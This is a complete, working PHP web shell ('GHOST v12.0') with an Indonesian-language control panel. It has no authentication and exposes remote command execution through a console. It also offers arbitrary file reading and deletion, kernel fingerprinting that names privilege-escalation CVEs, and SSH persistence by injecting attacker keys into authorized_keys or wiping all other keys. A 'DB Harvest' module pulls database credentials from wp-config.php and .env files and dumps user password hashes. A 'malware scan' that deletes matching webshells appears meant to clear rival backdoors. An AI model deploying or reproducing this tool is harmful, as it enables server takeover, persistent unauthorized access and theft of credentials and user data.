<?php
/**
 * GHOST v12.0 — The Complete & Tested Build
 * Fitur: Fingerprint, Deep Scan (Paginated), SSH Manager, DB Harvest, Auto-Heal, Console
 */
@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// ==========================================
// ENGINE EKSEKUSI & READ
// ==========================================
function g_exec($cmd, $timeout = 15) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    foreach (['shell_exec','system','passthru','exec','popen'] as $m) {
        if (!function_exists($m)) continue;
        if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return $out; }
        if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return $out; }
        if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return $out; }
        if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return implode("\n", $o); }
        if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
    }
    return "[-] Execution Blocked.";
}

function g_read($path) {
    if (!@is_file($path)) return "";
    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
    $f = @fopen($path, 'rb'); if ($f) { $d=''; while(!feof($f)) $d .= fread($f, 8192); fclose($f); return $d; }
    return g_exec('cat ' . escapeshellarg($path));
}

// ==========================================
// FINGERPRINTING
// ==========================================
function g_fingerprint() {
    $os = trim(g_exec('uname -a'));
    $cpanel = 'Not Found';
    foreach ([2082, 2083, 2086] as $port) { if (@fsockopen('127.0.0.1', $port, $e, $s, 0.5)) { $cpanel = "cPanel Active (Port $port)"; break; } }
    $cves = [];
    if (strpos($os, '4.18') !== false) $cves[] = "CVE-2022-0847 (Dirty Pipe)";
    if (strpos($os, '3.10') !== false) $cves[] = "CVE-2016-5195 (Dirty COW)";
    return ['OS'=>$os, 'User'=>trim(g_exec('whoami')), 'cPanel'=>$cpanel, 'CVEs'=>$cves];
}

// ==========================================
// DEEP INSPECTOR (Paginated & Klasifikasi)
// ==========================================
function g_scan_batch($dir, $offset = 0, $limit = 30) {
    $res = ['files'=>[], 'done'=>false, 'total'=>0];
    $ignore = ['jpg','jpeg','png','gif','mp4','mp3','pdf','zip','tar','gz','sqlite','svg','ico','woff','ttf','eot'];
    
    $all_files = [];
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));
        foreach ($it as $f) {
            if (!$f->isFile()) continue;
            if (in_array(strtolower($f->getExtension()), $ignore)) continue;
            if ($f->getSize() > 3 * 1024 * 1024) continue; // Max 3MB
            $all_files[] = $f->getPathname();
        }
    } catch (Throwable $e) {}

    $batch = array_slice($all_files, $offset, $limit);
    $res['done'] = ($offset + count($batch)) >= count($all_files);
    $res['total'] = count($all_files);

    $keywords = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan','pinjol'];
    
    foreach ($batch as $path) {
        $c = g_read($path);
        $size = @filesize($path);
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $type = ''; $desc = '';
        
        // Klasifikasi Malware yang sangat sensitif
        if ($size === 0 && $ext === 'php') {
            $type = 'Empty Shell'; $desc = 'File PHP kosong (Backdoor truncated).';
        } elseif (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false) {
            $type = 'Backdoor/RCE'; $desc = 'Terdeteksi fungsi eval/assert.';
        } elseif (preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) {
            $type = 'Direct Shell'; $desc = 'Eksekusi shell dari input HTTP.';
        } elseif (preg_match('/(base64_decode|gzinflate|str_rot13)\s*\(\s*[\'"][A-Za-z0-9+\/=]{50,}/i', $c)) {
            $type = 'Obfuscated Payload'; $desc = 'Payload terenkripsi panjang.';
        } elseif (preg_match('/(c99|r57|b374k|wso|alfa|indoxploit)/i', $c) || preg_match('/(c99|r57|b374k|wso)\.php/i', $path)) {
            $type = 'Known Webshell'; $desc = 'Signature webshell publik.';
        } elseif (!$ext && stripos($c, '<?php') !== false) {
            $type = 'Hidden PHP'; $desc = 'File tanpa ekstensi berisi kode PHP.';
        }

        $found_kw = [];
        foreach ($keywords as $k) { if (preg_match('/\b'.preg_quote($k,'/').'\b/i', $c)) $found_kw[] = $k; }

        if ($type !== '' || count($found_kw) > 0) {
            $res['files'][] = ['path'=>$path, 'type'=>$type, 'desc'=>$desc, 'keywords'=>array_unique($found_kw)];
        }
    }
    return $res;
}

// ==========================================
// SSH MANAGER
// ==========================================
function g_ssh($action = 'scan', $target = '') {
    $user = trim(g_exec('whoami'));
    $auth = trim(g_exec("eval echo ~$user")) . '/.ssh/authorized_keys';
    $res = ['keys'=>[], 'msg'=>''];
    if (!@is_file($auth)) return array_merge($res, ['msg'=>'File authorized_keys tidak ditemukan.']);
    $lines = array_filter(explode("\n", g_read($auth)));
    
    if ($action === 'scan') {
        foreach ($lines as $i => $l) { 
            $p = explode(' ', trim($l)); 
            $res['keys'][] = ['line'=>$i+1, 'type'=>$p[0]??'?', 'comment'=>$p[2]??'?', 'raw'=>trim($l)]; 
        }
    } elseif ($action === 'clean') {
        $clean = [];
        foreach ($lines as $l) { if (strpos($l, $target) !== false) $clean[] = trim($l); }
        file_put_contents($auth, implode("\n", $clean) . "\n");
        $res['msg'] = 'Dibersihkan. Sisa '.count($clean).' key.';
    } elseif ($action === 'inject') {
        if (strpos(g_read($auth), $target) === false) {
            file_put_contents($auth, trim(g_read($auth)) . "\n" . trim($target) . "\n");
            $res['msg'] = 'Key di-inject.';
        } else { $res['msg'] = 'Key sudah ada.'; }
    }
    return $res;
}

// ==========================================
// DB HARVEST
// ==========================================
function g_db_harvest() {
    $logs = []; $info = [];
    foreach (['wp-config.php', '.env', 'configuration.php', 'config/database.php'] as $cf) {
        if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
            $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
            $logs[] = "[+] Found: $cf";
            preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
            preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
            preg_match('/(?:DB_NAME|database)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $n);
            if ($u[1] && $p[1]) { $info = ['user'=>$u[1], 'pass'=>$p[1], 'db'=>$n[1] ?? '']; break; }
        }
    }
    if (!empty($info['user'])) {
        $logs[] = "[*] Connecting...";
        $conn = @mysqli_connect('localhost', $info['user'], $info['pass'], $info['db']);
        if ($conn) {
            $logs[] = "[!] DB Connected!";
            $q = @mysqli_query($conn, "SELECT user_login, user_pass FROM wp_users LIMIT 5");
            if (!$q) $q = @mysqli_query($conn, "SELECT username, password FROM users LIMIT 5");
            if ($q) { while ($r = mysqli_fetch_assoc($q)) { $logs[] = "Data: ".json_encode($r); } }
        } else $logs[] = "[-] Gagal: " . mysqli_connect_error();
    }
    return ['logs'=>$logs, 'info'=>$info];
}

// ==========================================
// ROUTER (Mencegah UI Rusak)
// ==========================================
$act = $_POST['act'] ?? '';
if ($act) {
    while (ob_get_level() > 0) ob_end_clean(); // Bersihkan buffer
    header('Content-Type: application/json');
    
    if ($act === 'fingerprint') echo json_encode(g_fingerprint());
    elseif ($act === 'scan') echo json_encode(g_scan_batch($GHOST_ROOT, (int)$_POST['offset'], 30));
    elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
    elseif ($act === 'ssh_scan') echo json_encode(g_ssh('scan'));
    elseif ($act === 'ssh_clean') echo json_encode(g_ssh('clean', $_POST['key']));
    elseif ($act === 'ssh_inject') echo json_encode(g_ssh('inject', $_POST['key']));
    elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path'])]);
    elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
    elseif ($act === 'exec') {
        $cmd = $_POST['cmd'] ?? '';
        if ($cmd === 'help') echo json_encode(['out'=>"Perintah Console:\n- whoami\n- uname -a\n- ls -la\n- netstat -tulpn\n- ps aux | grep root\n- find / -perm -4000 2>/dev/null"]);
        else echo json_encode(['out'=>g_exec($cmd)]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v12.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    input, button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-family:monospace; margin-bottom:5px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; font-size:12px; }
    table { width:100%; border-collapse:collapse; margin-top:10px; font-size:12px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; }
    th { background:#222; color:#0f0; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
    .btn-red { border-color:#f00; color:#f00; }
    .btn-red:hover { background:#f00; color:#000; }
    #modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; }
    #modal-content { background:#000; border:1px solid #0f0; margin:10% auto; padding:20px; width:80%; max-height:80%; overflow:auto; }
</style>
</head>
<body>

<div id="modal"><div id="modal-content"><pre id="modal-text"></pre><br><button onclick="document.getElementById('modal').style.display='none'">Close</button></div></div>

<div class="box">
    <h2>[+] Fingerprinting</h2>
    <button onclick="run('fingerprint','out-fp')">Scan Profile</button>
    <pre id="out-fp">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Inspector & Malware Scan</h2>
    <button onclick="startScan()">Scan Semua File</button>
    <div id="scan-status" style="margin-top:10px; color:#ff0;">Idle.</div>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] SSH Manager</h2>
    <button onclick="run('ssh_scan','ssh-table')">Scan SSH Keys</button>
    <div id="ssh-table"></div>
    <div style="margin-top:10px;">
        <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="width:60%;">
        <button onclick="sshAct('inject')">Inject</button>
        <button class="btn-red" onclick="sshAct('clean')">Clean Others</button>
    </div>
    <pre id="ssh-log"></pre>
</div>

<div class="box">
    <h2>[+] Database Harvest</h2>
    <button onclick="run('db_scan','db-result')">Scan DB</button>
    <pre id="db-result">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Auto-Heal Vulnerabilities</h2>
    <button onclick="healScan()">Scan Vulnerabilities</button>
    <div id="heal-table"></div>
    <button class="btn-red" onclick="healExec()">Heal Selected</button>
    <pre id="heal-log"></pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami / help" style="width:80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    return await r.json();
}

// SCAN
async function startScan() {
    let offset = 0; let mal = []; let ill = [];
    document.getElementById('scan-results').innerHTML = '';
    document.getElementById('scan-status').innerText = 'Memulai...';

    while (true) {
        document.getElementById('scan-status').innerText = `Scanning file ke-${offset}...`;
        try {
            const d = await api('scan', {offset: offset});
            d.files.forEach(f => {
                if (f.type !== '') mal.push(f);
                if (f.keywords.length) ill.push(f);
            });
            if (d.done) {
                document.getElementById('scan-status').innerText = `Selesai! Total ${d.total} file. Malware: ${mal.length}, Ilegal: ${ill.length}`;
                renderScan(mal, ill);
                break;
            }
            offset += 30;
        } catch(e) { document.getElementById('scan-status').innerText = 'Error: ' + e.message; break; }
    }
}

function renderScan(mal, ill) {
    let h = '';
    if (mal.length) {
        h += `<table><tr><th>Tipe</th><th>File</th><th>Analisis</th><th>Aksi</th></tr>`;
        mal.forEach(x => {
            h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td>
                <td><button onclick="viewFile('${encodeURIComponent(x.path)}')">View</button>
                <button class="btn-red" onclick="delFile('${encodeURIComponent(x.path)}')">Delete</button></td></tr>`;
        });
        h += `</table>`;
    }
    if (ill.length) {
        h += `<h3>Konten Ilegal</h3><table><tr><th>File</th><th>Keyword</th><th>Aksi</th></tr>`;
        ill.forEach(x => { h += `<tr><td>${esc(x.path)}</td><td>${esc(x.keywords.join(', '))}</td><td><button onclick="viewFile('${encodeURIComponent(x.path)}')">View</button></td></tr>`; });
        h += `</table>`;
    }
    if (!mal.length && !ill.length) h = '<p style="color:#0f0;">File Bersih.</p>';
    document.getElementById('scan-results').innerHTML = h;
}

// OTHER MODULES
async function run(act, target) {
    document.getElementById(target).innerText = 'Running...';
    try {
        const d = await api(act);
        if (act === 'ssh_scan') renderSSH(d);
        else document.getElementById(target).innerText = JSON.stringify(d,null,2);
    } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
}

function renderSSH(d) {
    let h = `<p>${esc(d.msg)}</p>`;
    if (d.keys.length) {
        h += `<table><tr><th>Line</th><th>Type</th><th>Comment</th><th>Raw</th></tr>`;
        d.keys.forEach(k => { h += `<tr><td>${k.line}</td><td>${k.type}</td><td>${k.comment}</td><td>${esc(k.raw)}</td></tr>`; });
        h += `</table>`;
    }
    document.getElementById('ssh-table').innerHTML = h;
}

async function sshAct(t) {
    const k = document.getElementById('ssh-key').value;
    if(!k) return alert('Isi key!');
    const d = await api(t==='inject'?'ssh_inject':'ssh_clean', {key:k});
    document.getElementById('ssh-log').innerText = d.msg;
    run('ssh_scan','');
}

async function healScan() {
    document.getElementById('heal-log').innerText = 'Scanning...';
    let allMal = []; let offset = 0;
    while (true) {
        const d = await api('scan', {offset: offset});
        d.files.forEach(f => { if(f.type!=='') allMal.push(f); });
        if (d.done) break;
        offset += 30;
    }
    let h = `<table><tr><th>Pilih</th><th>Tipe</th><th>Path</th><th>Analisis</th></tr>`;
    allMal.forEach(v => {
        h += `<tr><td><input type="checkbox" class="heal-cb" value="${encodeURIComponent(v.path)}" checked></td>
              <td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td><td>${esc(v.desc)}</td></tr>`;
    });
    h += `</table>`;
    document.getElementById('heal-table').innerHTML = h;
    document.getElementById('heal-log').innerText = '';
}

async function healExec() {
    const cbs = document.querySelectorAll('.heal-cb:checked');
    const paths = Array.from(cbs).map(cb => decodeURIComponent(cb.value));
    if(!paths.length) return alert('Pilih file dulu!');
    let logs = [];
    for (let p of paths) { await api('del_file', {path:p}); logs.push('Deleted: '+p); }
    document.getElementById('heal-log').innerText = logs.join('\n');
    document.getElementById('heal-table').innerHTML = '';
}

// FILE OPS
async function viewFile(enc) {
    document.getElementById('modal').style.display = 'block';
    document.getElementById('modal-text').innerText = 'Loading...';
    const d = await api('read_file', {path: decodeURIComponent(enc)});
    document.getElementById('modal-text').innerText = d.content.slice(0, 5000);
}
async function delFile(enc) {
    if(!confirm('Hapus file ini?')) return;
    await api('del_file', {path: decodeURIComponent(enc)});
    startScan();
}

// CONSOLE
async function execCmd() {
    const c = document.getElementById('cmd').value;
    if(!c) return;
    document.getElementById('out-exec').innerText = '$ '+c+'\nRunning...';
    const d = await api('exec',{cmd:c});
    document.getElementById('out-exec').innerText = '$ '+c+'\n\n'+d.out;
}
</script>
</body>
</html>
